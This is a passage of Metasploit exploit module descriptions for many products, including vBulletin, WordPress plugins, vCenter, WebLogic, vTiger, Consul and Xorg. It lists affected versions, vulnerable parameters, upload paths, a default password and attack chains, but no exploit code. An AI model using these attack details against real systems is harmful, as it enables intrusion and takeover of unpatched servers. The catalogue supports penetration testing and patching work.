multi/http/vbseo_proc_deutf
This module exploits a vulnerability in the 'proc_deutf()' function defined in /includes/functions_vbseocp_abstract.php for vBSEO versions 3.6.0 and earlier. User input passed through 'char_repl' POST parameter isn't properly sanitized before being used in a call to preg_replace() function which uses the 'e' modifier. This can be exploited to inject and execute arbitrary code leveraging the PHP's complex curly syntax.

multi/http/vbulletin_getindexablecontent
This module exploits a SQL injection vulnerability found in vBulletin 5.6.1 and earlier This module uses the getIndexableContent vulnerability to reset the administrators password, it then uses the administrators login information to achieve RCE on the target. This module has been tested successfully on VBulletin Version 5.6.1 on Ubuntu Linux distribution.

multi/http/vbulletin_unserialize
This module exploits a PHP object injection vulnerability in vBulletin 5.1.2 to 5.1.9

multi/http/vbulletin_widget_template_rce
This module exploits a logic bug within the template rendering code in vBulletin 5.x. The module uses the vBulletin template rendering functionality to render the 'widget_tabbedcontainer_tab_panel' template while also providing the 'widget_php' argument. This causes the former template to load the latter bypassing filters originally put in place to address 'CVE-2019-16759'. This also allows the exploit to reach an eval call with user input allowing the module to achieve PHP remote code execution on the target. This module has been tested successfully on vBulletin version 5.6.2 on Ubuntu Linux.

multi/http/vbulletin_widgetconfig_rce
vBulletin 5.x through 5.5.4 allows remote command execution via the widgetConfig[code] parameter in an ajax/render/widget_php routestring POST request.

multi/http/visual_mining_netcharts_upload
This module exploits multiple vulnerabilities in Visual Mining NetCharts. First, a lack of input validation in the administration console permits arbitrary jsp code upload to locations accessible later through the web service. Authentication is typically required, however a 'hidden' user is available by default (and non-editable). This user, named 'Scheduler', can only login to the console after any modification in the user database (a user is added, admin password is changed etc). If the 'Scheduler' user isn't available valid credentials must be supplied. The default Admin password is Admin.

multi/http/vmware_vcenter_log4shell
VMware vCenter Server is affected by the Log4Shell vulnerability whereby a JNDI string can sent to the server that will cause it to connect to the attacker and deserialize a malicious Java object. This results in OS command execution in the context of the root user in the case of the Linux virtual appliance and SYSTEM on Windows. This module will start an LDAP server that the target will need to connect to. This exploit uses the logon page vector.

multi/http/vmware_vcenter_uploadova_rce
This module exploits an unauthenticated OVA file upload and path traversal in VMware vCenter Server to write a JSP payload to a web-accessible directory. Fixed versions are 6.5 Update 3n, 6.7 Update 3l, and 7.0 Update 1c. Note that later vulnerable versions of the Linux appliance aren't exploitable via the webshell technique. Furthermore, writing an SSH public key to /home/vsphere-ui/.ssh/authorized_keys works, but the user's non-existent password expires 90 days after install, rendering the technique nearly useless against production environments. You'll have the best luck targeting older versions of the Linux appliance. The Windows target should work ubiquitously.

multi/http/vtiger_install_rce
This module exploits an arbitrary command execution vulnerability in the Vtiger install script. This module is set to ManualRanking due to this module overwriting the target database configuration, which may result in a broken web app, and you may not be able to get a session again.

multi/http/vtiger_logo_upload_exec
Vtiger 6.3.0 CRM's administration interface allows for the upload of a company logo. Instead of uploading an image, an attacker may choose to upload a file containing PHP code and run this code by accessing the resulting PHP file. This module was tested against vTiger CRM v6.3.0.

multi/http/vtiger_php_exec
vTiger CRM allows an authenticated user to upload files to embed within documents. Due to insufficient privileges on the 'files' upload folder, an attacker can upload a PHP script and execute arbitrary PHP code remotely. This module was tested against vTiger CRM v5.4.0 and v5.3.0.

multi/http/vtiger_soap_upload
vTiger CRM allows a user to bypass authentication when requesting SOAP services. In addition, arbitrary file upload is possible through the AddEmailAttachment SOAP service. By combining both vulnerabilities an attacker can upload and execute PHP code. This module has been tested successfully on vTiger CRM v5.4.0 over Ubuntu 10.04 and Windows 2003 SP2.

multi/http/weblogic_admin_handle_rce
This module exploits a path traversal and a Java class instantiation in the handle implementation of WebLogic's Administration Console to execute code as the WebLogic user. Versions 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, and 14.1.1.0.0 are known to be affected. Tested against 12.2.1.3.0 from Vulhub (Linux) and on Windows. Warning! Multiple sessions may be created by exploiting this vuln.

multi/http/webnms_file_upload
This module abuses a vulnerability in WebNMS Framework Server 5.2 that allows an unauthenticated user to upload text files by using a directory traversal attack on the FileUploadServlet servlet. A JSP file can be uploaded that then drops and executes a malicious payload, achieving code execution under the user which the WebNMS server is running. This module has been tested with WebNMS Framework Server 5.2 and 5.2 SP1 on Windows and Linux.

multi/http/webpagetest_upload_exec
This module exploits a vulnerability found in WebPageTest's Upload Feature. By default, the resultimage.php file does not verify the user-supplied item before saving it to disk, and then places this item in the web directory accessible by remote users. This flaw can be abused to gain remote code execution.

multi/http/werkzeug_debug_rce
This module will exploit the Werkzeug debug console to put down a Python shell. This debugger "must never be used on production machines" but sometimes slips passed testing. Tested against: 0.9.6 on Debian 0.9.6 on Centos 0.10 on Debian

multi/http/wikka_spam_exec
This module exploits a vulnerability found in WikkaWiki. When the spam logging feature is enabled, it is possible to inject PHP code into the spam log file via the UserAgent header, and then request it to execute our payload. There are at least three different ways to trigger spam protection, this module does so by generating 10 fake URLs in a comment (by default, the max_new_comment_urls parameter is 6). Please note that in order to use the injection, you must manually pick a page first that allows you to add a comment, and then set it as 'PAGE'.

multi/http/wp_ait_csv_rce
The AIT CSV Import/Export plugin <= 3.0.3 allows unauthenticated remote attackers to upload and execute arbitrary PHP code. The upload-handler does not require authentication, nor validates the uploaded content. It may return an error when attempting to parse a CSV, however the uploaded shell is left. The shell is uploaded to wp-content/uploads/. The plugin is not required to be activated to be exploitable.

multi/http/wp_catch_themes_demo_import
The Wordpress Plugin Catch Themes Demo Import versions < 1.8 are vulnerable to authenticated arbitrary file uploads via the import functionality found in the ~/inc/CatchThemesDemoImport.php file, due to insufficient file type validation. Re-exploitation may need a reboot of the server, or to wait an arbitrary timeout. During testing this timeout was roughly 5min.

multi/http/wp_crop_rce
This module exploits a path traversal and a local file inclusion vulnerability on WordPress versions 5.0.0 and <= 4.9.8. The crop-image function allows a user, with at least author privileges, to resize an image and perform a path traversal by changing the _wp_attached_file reference during the upload. The second part of the exploit will include this image in the current theme by changing the _wp_page_template attribute when creating a post. This exploit module only works for Unix-based systems currently.

multi/http/wp_db_backup_rce
There exists a command injection vulnerability in the Wordpress plugin `wp-database-backup` for versions < 5.2. For the backup functionality, the plugin generates a `mysqldump` command to execute. The user can choose specific tables to exclude from the backup by setting the `wp_db_exclude_table` parameter in a POST request to the `wp-database-backup` page. The names of the excluded tables are included in the `mysqldump` command unsanitized. Arbitrary commands injected through the `wp_db_exclude_table` parameter are executed each time the functionality for creating a new database backup are run. Authentication is required to successfully exploit this vulnerability.

multi/http/wp_dnd_mul_file_rce
This module exploits a file upload feature of Drag and Drop Multi File Upload - Contact Form 7 for versions prior to 1.3.4. The allowed file extension list can be bypassed by appending a %, allowing for php shells to be uploaded. No authentication is required for exploitation.

multi/http/wp_file_manager_rce
The File Manager (wp-file-manager) plugin from 6.0 to 6.8 for WordPress allows remote attackers to upload and execute arbitrary PHP code because it renames an unsafe example elFinder connector file to have the .php extension. This, for example, allows attackers to run the elFinder upload (or mkfile and put) command to write PHP code into the wp-content/plugins/wp-file-manager/lib/files/ directory.

multi/http/wp_ninja_forms_unauthenticated_file_upload
Versions 2.9.36 to 2.9.42 of the Ninja Forms plugin contain an unauthenticated file upload vulnerability, allowing guests to upload arbitrary PHP code that can be executed in the context of the web server.

multi/http/wp_plugin_backup_guard_rce
This module allows an attacker with a privileged Wordpress account to launch a reverse shell due to an arbitrary file upload vulnerability in Wordpress plugin Backup Guard < 1.6.0. This is due to an incorrect check of the uploaded file extension which should be of SGBP type. Then, the uploaded payload can be triggered by a call to `/wp-content/uploads/backup-guard/<random_payload_name>.php`

multi/http/wp_plugin_elementor_auth_upload_rce
The WordPress plugin Elementor versions 3.6.0 - 3.6.2, inclusive have a vulnerability that allows any authenticated user to upload and execute any PHP file. This is achieved by sending a request to install Elementor Pro from a user supplied zip file. Any user with Subscriber or more permissions is able to execute this. Tested against Elementor 3.6.1

multi/http/wp_plugin_fma_shortcode_unauth_rce
The Wordpress plugin does not adequately prevent uploading files with disallowed MIME types when using the shortcode. This leads to RCE in cases where the allowed MIME type list does not include PHP files. In the worst case, this is available to unauthenticated users, but is also works in an authenticated configuration. File Manager Advanced Shortcode plugin version `2.3.2` and lower are vulnerable. To install the Shortcode plugin File Manager Advanced version `5.0.5` or lower is required to keep the configuration vulnerable. Any user privileges can exploit this vulnerability which results in access to the underlying operating system with the same privileges under which the Wordpress web services run. 

multi/http/wp_plugin_modern_events_calendar_rce
This module allows an attacker with a privileged Wordpress account to launch a reverse shell due to an arbitrary file upload vulnerability in Wordpress plugin Modern Events Calendar < 5.16.5. This is due to an incorrect check of the uploaded file extension. Indeed, by using `text/csv` content-type in a request, it is possible to upload a .php payload as is is not forbidden by the plugin. Finally, the uploaded payload can be triggered by a call to `/wp-content/uploads/<random_payload_name>.php`

multi/http/wp_plugin_sp_project_document_rce
This module allows an attacker with a privileged Wordpress account to launch a reverse shell due to an arbitrary file upload vulnerability in Wordpress plugin SP Project & Document < 4.22. The security check only searches for lowercase file extensions such as `.php`, making it possible to upload `.pHP` files for instance. Finally, the uploaded payload can be triggered by a call to `/wp-content/uploads/sp-client-document-manager/<user_id>/<random_payload_name>.php`

multi/http/wp_popular_posts_rce
This exploit requires Metasploit to have a FQDN and the ability to run a payload web server on port 80, 443, or 8080. The FQDN must also not resolve to a reserved address (192/172/127/10). The server must also respond to a HEAD request for the payload, prior to getting a GET request. This exploit leverages an authenticated improper input validation in Wordpress plugin Popular Posts <= 5.3.2. The exploit chain is rather complicated. Authentication is required and 'gd' for PHP is required on the server. Then the Popular Post plugin is reconfigured to allow for an arbitrary URL for the post image in the widget. A post is made, then requests are sent to the post to make it more popular than the previous #1 by 5. Once the post hits the top 5, and after a 60sec (we wait 90) server cache refresh, the homepage widget is loaded which triggers the plugin to download the payload from our server. Our payload has a 'GIF' header, and a double extension ('.gif.php') allowing for arbitrary PHP code to be executed.

multi/http/wp_responsive_thumbnail_slider_upload
This module exploits an arbitrary file upload vulnerability in Responsive Thumbnail Slider Plugin v1.0 for WordPress post authentication.

multi/http/wp_simple_file_list_rce
Simple File List (simple-file-list) plugin before 4.2.3 for WordPress allows remote unauthenticated attackers to upload files within a controlled list of extensions. However, the rename function does not conform to the file extension restrictions, thus allowing arbitrary PHP code to be uploaded first as a png then renamed to php and executed.

multi/http/wso2_file_upload_rce
This module abuses a vulnerability in certain WSO2 products that allow unrestricted file upload with resultant remote code execution. This affects WSO2 API Manager 2.2.0 and above through 4.0.0; WSO2 Identity Server 5.2.0 and above through 5.11.0; WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, and 5.6.0; WSO2 Identity Server as Key Manager 5.3.0 and above through 5.10.0; and WSO2 Enterprise Integrator 6.2.0 and above through 6.6.0.

multi/http/x7chat2_php_exec
This module exploits a post-auth vulnerability found in X7 Chat versions 2.0.0 up to 2.0.5.1. The vulnerable code exists on lib/message.php, which uses preg_replace() function with the /e modifier. This allows a remote authenticated attacker to execute arbitrary PHP code in the remote machine.

multi/http/zabbix_script_exec
ZABBIX allows an administrator to create scripts that will be run on hosts. An authenticated attacker can create a script containing a payload, then a host with an IP of 127.0.0.1 and run the arbitrary script on the ZABBIX host. This module was tested against Zabbix v2.0.9, v2.0.5, v3.0.1, v4.0.18, v5.0.17, v6.0.0.

multi/http/zemra_panel_rce
This module exploits the CnC web panel of Zemra Botnet which contains a backdoor inside its leaked source code. Zemra is a crimeware bot that can be used to conduct DDoS attacks and is detected by Symantec as Backdoor.Zemra.

multi/http/zenworks_configuration_management_upload
This module exploits a file upload vulnerability in Novell ZENworks Configuration Management (ZCM, which is part of the ZENworks Suite). The vulnerability exists in the UploadServlet which accepts unauthenticated file uploads and does not check the "uid" parameter for directory traversal characters. This allows an attacker to write anywhere in the file system, and can be abused to deploy a WAR file in the Tomcat webapps directory. ZCM up to (and including) 11.3.1 is vulnerable to this attack. This module has been tested successfully with ZCM 11.3.1 on Windows and Linux. Note that this is a similar vulnerability to ZDI-10-078 / OSVDB-63412 which also has a Metasploit exploit, but it abuses a different parameter of the same servlet.

multi/http/zenworks_control_center_upload
This module exploits a code execution flaw in Novell ZENworks Configuration Management 10 SP3 and 11 SP2. The vulnerability exists in the ZENworks Control Center application, allowing an unauthenticated attacker to upload a malicious file outside of the TEMP directory and then make a second request that allows for arbitrary code execution. This module has been tested successfully on Novell ZENworks Configuration Management 10 SP3 and 11 SP2 on Windows 2003 SP2 and SUSE Linux Enterprise Server 10 SP3.

multi/http/zpanel_information_disclosure_rce
This module exploits an information disclosure vulnerability in ZPanel. The vulnerability is due to a vulnerable version of pChart used by ZPanel that allows unauthenticated users to read arbitrary files remotely on the file system. This particular module utilizes this vulnerability to identify the username/password combination of the MySQL instance. With the credentials the attackers can login to PHPMyAdmin and execute SQL commands to drop a malicious payload on the filesystem and call it leading to remote code execution.

multi/ids/snort_dce_rpc
This module allows remote attackers to execute arbitrary code by exploiting the Snort service via crafted SMB traffic. The vulnerability is due to a boundary error within the DCE/RPC preprocessor when reassembling SMB Write AndX requests, which may result a stack-based buffer overflow with a specially crafted packet sent on a network that is monitored by Snort. Vulnerable versions include Snort 2.6.1, 2.7 Beta 1 and SourceFire IDS 4.1, 4.5 and 4.6. Any host on the Snort network may be used as the remote host. The remote host does not need to be running the SMB service for the exploit to be successful.

multi/iiop/cve_2023_21839_weblogic_rce
Oracle Weblogic 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 prior to the Jan 2023 security update are vulnerable to an unauthenticated remote code execution vulnerability due to a post deserialization vulnerability. This occurs when an attacker serializes a "ForeignOpaqueReference" class object, deserializes it on the target, and then post deserialization, calls the object's "getReferent()" method, which will make use of the "ForeignOpaqueReference" class's "remoteJNDIName" variable, which is under the attackers control, to do a remote loading of the JNDI address specified by "remoteJNDIName" via the "lookup()" function. This can in turn lead to a deserialization vulnerability whereby an attacker supplies the address of a HTTP server hosting a malicious Java class file, which will then be loaded into the Oracle Weblogic process's memory and an attempt to create a new instance of the attacker's class will be made. Attackers can utilize this to execute arbitrary Java code during the instantiation of the object, thereby getting remote code execution as the "oracle" user. This module exploits this vulnerability to trigger the JNDI connection to a LDAP server we control. The LDAP server will then respond with a remote reference response that points to a HTTP server that we control, where the malicious Java class file will be hosted. Oracle Weblogic will then make a HTTP request to retrieve the malicious Java class file, at which point our HTTP server will serve up the malicious class file and Oracle Weblogic will instantiate an instance of that class, granting us RCE as the "oracle" user. This vulnerability was exploited in the wild as noted by KEV on May 1st 2023: https://www.fortiguard.com/outbreak-alert/oracle-weblogic-server-vulnerability

multi/kubernetes/exec
Execute a payload within a Kubernetes pod.

multi/local/allwinner_backdoor
This module attempts to exploit a debug backdoor privilege escalation in Allwinner SoC based devices. Vulnerable Allwinner SoC chips: H3, A83T or H8 which rely on Kernel 3.4. Vulnerable OS: all OS images available for Orange Pis, any for FriendlyARM's NanoPi M1, SinoVoip's M2+ and M3, Cuebietech's Cubietruck + Linksprite's pcDuino8 Uno. Exploitation may be possible against Dragon (x10) and Allwinner Android tablets.

multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc
This module attempts to gain root privileges on systems running MagniComp SysInfo versions prior to 10-H64. The .mcsiwrapper suid executable allows loading a config file using the '--configfile' argument. The 'ExecPath' config directive is used to set the executable load path. This module abuses this functionality to set the load path resulting in execution of arbitrary code as root. This module has been tested successfully with SysInfo version 10-H63 on Fedora 20 x86_64, 10-H32 on Fedora 27 x86_64, 10-H10 on Debian 8 x86_64, and 10-GA on Solaris 10u11 x86.

multi/local/vagrant_synced_folder_vagrantfile_breakout
This module exploits a default Vagrant synced folder (shared folder) to append a Ruby payload to the Vagrant project Vagrantfile config file. By default, unless a Vagrant project explicitly disables shared folders, Vagrant mounts the project directory on the host as a writable 'vagrant' directory on the guest virtual machine. This directory includes the project Vagrantfile configuration file. Ruby code within the Vagrantfile is loaded and executed when a user runs any vagrant command from the project directory on the host, leading to execution of Ruby code on the host.

multi/local/xorg_x11_suid_server
This module attempts to gain root privileges with SUID Xorg X11 server versions 1.19.0 < 1.20.3. A permission check flaw exists for -modulepath and -logfile options when starting Xorg. This allows unprivileged users that can start the server the ability to elevate privileges and run arbitrary code under root privileges. This module has been tested with OpenBSD 6.3, 6.4, CentOS 7.4.1708, and CentOS 7.5.1804, and RHEL 7.5. The default PAM configuration for CentOS and RHEL systems requires console auth for the user's session to start the Xorg server. Cron launches the payload, so if SELinux is enforcing, exploitation may still be possible, but the module will bail. Xorg must have SUID permissions and may not start if already running. On exploitation a crontab.old backup file will be created by Xorg. This module will remove the .old file and restore crontab after successful exploitation. Failed exploitation may result in a corrupted crontab. On successful exploitation artifacts will be created consistant with starting Xorg and running a cron.

multi/local/xorg_x11_suid_server_modulepath
This module attempts to gain root privileges with SUID Xorg X11 server versions 1.19.0 < 1.20.3. A permission check flaw exists for -modulepath and -logfile options when starting Xorg. This allows unprivileged users that can start the server the ability to elevate privileges and run arbitrary code under root privileges. This module has been tested with CentOS 7 (1708). CentOS default install will require console auth for the users session. Xorg must have SUID permissions and may not start if running. On successful exploitation artifacts will be created consistant with starting Xorg.

multi/misc/arkeia_agent_exec
This module exploits a code execution flaw in Western Digital Arkeia version 11.0.12 and below. The vulnerability exists in the 'arkeiad' daemon listening on TCP port 617. Because there are insufficient checks on the authentication of all clients, this can be bypassed. Using the ARKFS_EXEC_CMD operation it's possible to execute arbitrary commands with root or SYSTEM privileges. The daemon is installed on both the Arkeia server as well on all the backup clients. The module has been successfully tested on Windows, Linux, OSX, FreeBSD and OpenBSD.

multi/misc/batik_svg_java
This module abuses the SVG support to execute Java Code in the Squiggle Browser included in the Batik framework 1.7 through a crafted SVG file referencing a jar file. In order to gain arbitrary code execution, the browser must meet the following conditions: (1) It must support at least SVG version 1.1 or newer, (2) It must support Java code and (3) The "Enforce secure scripting" check must be disabled. The module has been tested against Windows and Linux platforms.

multi/misc/bmc_patrol_cmd_exec
This module leverages the remote command execution feature provided by the BMC Patrol Agent software. It can also be used to escalate privileges on Windows hosts as the software runs as SYSTEM but only verfies that the password of the provided user is correct. This also means if the software is running on a domain controller, it can be used to escalate from a normal domain user to domain admin as SYSTEM on a DC is DA. **WARNING** The windows version of this exploit uses powershell to execute the payload. The powershell version tends to timeout on the first run so it may take multiple tries.

multi/misc/bmc_server_automation_rscd_nsh_rce
This module exploits a weak access control check in the BMC Server Automation RSCD agent that allows arbitrary operating system commands to be executed without authentication. Note: Under Windows, non-powershell commands may need to be prefixed with 'cmd /c'.

multi/misc/claymore_dual_miner_remote_manager_rce
This module takes advantage of miner remote manager APIs to exploit an RCE vulnerability.

multi/misc/consul_rexec_exec
This module exploits a feature of Hashicorp Consul named rexec.

multi/misc/consul_service_exec
This module exploits Hashicorp Consul's services API to gain remote command execution on Consul nodes.

multi/misc/erlang_cookie_rce
The erlang port mapper daemon is used to coordinate distributed erlang instances. Should an attacker get the authentication cookie RCE is trivial. Usually, this cookie is named ".erlang.cookie" and varies on location.

multi/misc/freeswitch_event_socket_cmd_exec
This module uses the FreeSWITCH event socket interface to execute system commands using the `system` API command. The event socket service is enabled by default and listens on TCP port 8021 on the local network interface. This module has been tested successfully on FreeSWITCH versions: 1.6.10-17-726448d~44bit on FreeSWITCH-Deb8-TechPreview virtual machine; 1.8.4~64bit on Ubuntu 19.04 (x64); and 1.10.1~64bit on Windows 7 SP1 (EN) (x64).

multi/misc/hp_data_protector_exec_integutil
This exploit abuses a vulnerability in the HP Data Protector. The vulnerability exists in the Backup client service, which listens by default on TCP/5555. The EXEC_INTEGUTIL request allows to execute arbitrary commands from a restricted directory. Since it includes a perl executable, it's possible to use an EXEC_INTEGUTIL packet to execute arbitrary code. On linux targets, the perl binary isn't on the restricted directory, but an EXEC_BAR packet can be used to access the perl binary, even in the last version of HP Data Protector for linux. This module has been tested successfully on HP Data Protector 9 over Windows 2008 R2 64 bits and CentOS 6 64 bits.

multi/misc/hp_vsa_exec
This module exploits a vulnerability found in HP's StorageWorks P4000 VSA on versions prior to 9.5. By using a default account credential, it is possible to inject arbitrary commands as part of a ping request via port 13838.

multi/misc/ibm_tm1_unauth_rce
This module exploits a vulnerability in IBM TM1 / Planning Analytics that allows an unauthenticated attacker to perform a configuration overwrite. It starts by querying the Admin server for the available applications, picks one, and then exploits it. You can also provide an application name to bypass this step, and exploit the application directly. The configuration overwrite is used to change an application server authentication method to "CAM", a proprietary IBM auth method, which is simulated by the exploit. The exploit then performs a fake authentication as admin, and finally abuses TM1 scripting to perform a command injection as root or SYSTEM. Testing was done on IBM PA 2.0.6 and IBM TM1 10.2.2 on Windows and Linux. Versions up to and including PA 2.0.8 are vulnerable. It is likely that versions earlier than TM1 10.2.2 are also vulnerable (10.2.2 was released in 2014).

multi/misc/indesign_server_soap
This module abuses the "RunScript" procedure provided by the SOAP interface of Adobe InDesign Server, to execute arbitrary vbscript (Windows) or applescript (OSX). The exploit drops the payload on the server and must be removed manually.

multi/misc/java_jdwp_debugger
This module abuses exposed Java Debug Wire Protocol services in order to execute arbitrary Java code remotely. It just abuses the protocol features, since no authentication is required if the service is enabled.

multi/misc/java_jmx_server
This module takes advantage a Java JMX interface insecure configuration, which would allow loading classes from any remote (HTTP) URL. JMX interfaces with authentication disabled (com.sun.management.jmxremote.authenticate=false) should be vulnerable, while interfaces with authentication enabled will be vulnerable only if a weak configuration is deployed (allowing to use javax.management.loading.MLet, having a security manager allowing to load a ClassLoader MBean, etc.).

multi/misc/java_rmi_server
This module takes advantage of the default configuration of the RMI Registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL. As it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java process. RMI method calls do not support or require any sort of authentication.

multi/misc/jboss_remoting_unified_invoker_rce
An unauthenticated attacker with network access to the JBOSS EAP/AS <= 6.x Remoting Unified Invoker interface can send a serialized object to the interface to execute code on vulnerable hosts.

multi/misc/legend_bot_exec
This module exploits a remote command execution on the Legend Perl IRC Bot. This bot has been used as a payload in the Shellshock spam last October 2014. This particular bot has functionalities like NMAP scanning, TCP, HTTP, SQL, and UDP flooding, the ability to remove system logs, and ability to gain root, and VNC scanning. Kevin Stevens, a Senior Threat Researcher at Damballa, has uploaded this script to VirusTotal with a md5 of 11a9f1589472efa719827079c3d13f76.

multi/misc/msf_rpc_console
This module connects to a specified Metasploit RPC server and uses the 'console.write' procedure to execute operating system commands. Valid credentials are required to access the RPC interface. This module has been tested successfully on Metasploit 4.15 on Kali 1.0.6; Metasploit 4.14 on Kali 2017.1; and Metasploit 4.14 on Windows 7 SP1.

multi/misc/msfd_rce_remote
Metasploit's msfd-service makes it possible to get a msfconsole-like interface over a TCP socket. If this socket is accessible on a remote interface, an attacker can execute commands on the victim's machine. If msfd is running with higher privileges than the current local user, this module can also be used for privilege escalation. In that case, port forwarding on the compromised host can be used. Code execution is achieved with the msfconsole command: irb -e 'CODE'.

multi/misc/nodejs_v8_debugger
This module uses the "evaluate" request type of the NodeJS V8 debugger protocol (version 1) to evaluate arbitrary JS and call out to other system commands. The port (default 5858) is not exposed non-locally in default configurations, but may be exposed either intentionally or via misconfiguration.

multi/misc/nomad_exec
Create a batch job on HashiCorp's Nomad service to spawn a shell. The default option is to use the 'raw_exec' driver, which runs with high privileges. Development servers and client's explicitly enabling the 'raw_exec' plugin can spawn these type of jobs. Regular 'exec' jobs can be created in a similar fashion at a lower privilege level.

multi/misc/openoffice_document_macro
This module generates an Apache OpenOffice Text Document with a malicious macro in it. To exploit successfully, the targeted user must adjust the security level in Macro Security to either Medium or Low. If set to Medium, a prompt is presented to the user to enable or disable the macro. If set to Low, the macro can automatically run without any warning. The module also works against LibreOffice.

multi/misc/openview_omniback_exec
This module uses a vulnerability in the OpenView Omniback II service to execute arbitrary commands. This vulnerability was discovered by DiGiT and his code was used as the basis for this module. For Microsoft Windows targets, due to module limitations, use the "unix/cmd/generic" payload and set CMD to your command. You can only pass a small amount of characters (4) to the command line on Windows.

multi/misc/osgi_console_exec
Exploit Eclipse Equinox OSGi (Open Service Gateway initiative) console 'fork' command to execute arbitrary commands on the remote system.

multi/misc/pbot_exec
This module allows remote command execution on the PHP IRC bot pbot by abusing the usage of eval() in the implementation of the .php command. In order to work, the data to connect to the IRC server and channel where find pbot must be provided. The module has been successfully tested on the version of pbot analyzed by Jay Turla, and published on Infosec Institute, running over Ubuntu 10.04 and Windows XP SP3.

multi/misc/persistent_hpca_radexec_exec
This module exploits a command injection vulnerability on HP Client Automation, distributed actually as Persistent Systems Client Automation. The vulnerability exists in the Notify Daemon (radexecd.exe), which doesn't authenticate execution requests by default. This module has been tested successfully on HP Client Automation 9.00 on Windows 2003 SP2 and CentOS 5.

multi/misc/qemu_monitor_hmp_migrate_cmd_exec
This module uses QEMU's Monitor Human Monitor Interface (HMP) TCP server to execute system commands using the `migrate` command. This module has been tested successfully on QEMU version 6.2.0 on Ubuntu 20.04.

multi/misc/ra1nx_pubcall_exec
This module allows remote command execution on the PHP IRC bot Ra1NX by using the public call feature in private message to covertly bypass the authentication system.

multi/misc/teamcity_agent_xmlrpc_exec
This module allows remote code execution on TeamCity Agents configured to use bidirectional communication via xml-rpc. In bidirectional mode the TeamCity server pushes build commands to the Build Agents over port TCP/9090 without requiring authentication. Up until version 10 this was the default configuration. This module supports TeamCity agents from version 6.0 onwards.

multi/misc/veritas_netbackup_cmdexec
This module allows arbitrary command execution on an ephemeral port opened by Veritas NetBackup, whilst an administrator is authenticated. The port is opened and allows direct console access as root or SYSTEM from any source address.

multi/misc/w3tw0rk_exec
This module allows remote command execution on the w3tw0rk / Pitbul IRC Bot.

multi/misc/weblogic_deserialize
An unauthenticated attacker with network access to the Oracle Weblogic Server T3 interface can send a serialized object to the interface to execute code on vulnerable hosts.

multi/misc/weblogic_deserialize_asyncresponseservice
An unauthenticated attacker with network access to the Oracle Weblogic Server T3 interface can send a malicious SOAP request to the interface WLS AsyncResponseService to execute code on the vulnerable host.

multi/misc/weblogic_deserialize_badattr_extcomp
There exists a Java object deserialization vulnerability in multiple versions of WebLogic. Unauthenticated remote code execution can be achieved by sending a serialized `BadAttributeValueExpException` object over the T3 protocol to vulnerable versions of WebLogic. Leveraging an `ExtractorComparator` enables the ability to trigger `method.invoke()`, which will execute arbitrary code.

multi/misc/weblogic_deserialize_badattrval
There exists a Java object deserialization vulnerability in multiple versions of WebLogic. Unauthenticated remote code execution can be achieved by sending a serialized BadAttributeValueExpException object over the T3 protocol to vulnerable WebLogic servers.

multi/misc/weblogic_deserialize_marshalledobject
An unauthenticated attacker with network access to the Oracle Weblogic Server T3 interface can send a serialized object (weblogic.corba.utils.MarshalledObject) to the interface to execute code on vulnerable hosts.

multi/misc/weblogic_deserialize_rawobject
An unauthenticated attacker with network access to the Oracle Weblogic Server T3 interface can send a serialized object (weblogic.jms.common.StreamMessageImpl) to the interface to execute code on vulnerable hosts.

multi/misc/weblogic_deserialize_unicastref
An unauthenticated attacker with network access to the Oracle Weblogic Server T3 interface can send a serialized object (sun.rmi.server.UnicastRef) to the interface to execute code on vulnerable hosts.

multi/misc/wireshark_lwres_getaddrbyname
The LWRES dissector in Wireshark version 0.9.15 through 1.0.10 and 1.2.0 through 1.2.5 allows remote attackers to execute arbitrary code due to a stack-based buffer overflow. This bug found and reported by babi. This particular exploit targets the dissect_getaddrsbyname_request function. Several other functions also contain potentially exploitable stack-based buffer overflows. The Windows version (of 1.2.5 at least) is compiled with /GS, which prevents exploitation via the return address on the stack. Sending a larger string allows exploitation using the SEH bypass method. However, this packet will usually get fragmented, which may cause additional complications. NOTE: The vulnerable code is reached only when the packet dissection is rendered. If the packet is fragmented, all fragments must be captured and reassembled to exploit this issue.

multi/misc/wireshark_lwres_getaddrbyname_loop
The LWRES dissector in Wireshark version 0.9.15 through 1.0.10 and 1.2.0 through 1.2.5 allows remote attackers to execute arbitrary code due to a stack-based buffer overflow. This bug found and reported by babi. This particular exploit targets the dissect_getaddrsbyname_request function. Several other functions also contain potentially exploitable stack-based buffer overflows. The Windows version (of 1.2.5 at least) is compiled with /GS, which prevents exploitation via the return address on the stack. Sending a larger string allows exploitation using the SEH bypass method. However, this packet will usually get fragmented, which may cause additional complications. NOTE: The vulnerable code is reached only when the packet dissection is rendered. If the packet is fragmented, all fragments must be captured and reassembled to exploit this issue. This version loops, sending the packet every X seconds until the job is killed.

multi/misc/xdh_x_exec
This module allows remote command execution on an IRC Bot developed by xdh. This perl bot was caught by Conor Patrick with his shellshock honeypot server and is categorized by Markus Zanke as an fBot (Fire & Forget - DDoS Bot). Matt Thayer also found this script which has a description of LinuxNet perlbot. The bot answers only based on the servername and nickname in the IRC message which is configured on the perl script thus you need to be an operator on the IRC network to spoof it and in order to exploit this bot or have at least the same ip to the config.

multi/misc/zend_java_bridge
This module takes advantage of a trust relationship issue within the Zend Server Java Bridge. The Java Bridge is responsible for handling interactions between PHP and Java code within Zend Server. When Java code is encountered Zend Server communicates with the Java Bridge. The Java Bridge then handles the java code and creates the objects within the Java Virtual Machine. This interaction however, does not require any sort of authentication. This leaves the JVM wide open to remote attackers. Sending specially crafted data to the Java Bridge results in the execution of arbitrary java code.

multi/mysql/mysql_udf_payload
This module creates and enables a custom UDF (user defined function) on the target host via the SELECT ... into DUMPFILE method of binary injection. On default Microsoft Windows installations of MySQL (=< 5.5.9), directory write permissions not enforced, and the MySQL service runs as LocalSystem. NOTE: This module will leave a payload executable on the target system when the attack is finished, as well as the UDF DLL, and will define or redefine sys_eval() and sys_exec() functions.

multi/ntp/ntp_overflow
This module exploits a stack based buffer overflow in the ntpd and xntpd service. By sending an overly long 'readvar' request it is possible to execute code remotely. As the stack is corrupted, this module uses the Egghunter technique.

multi/php/ignition_laravel_debug_rce
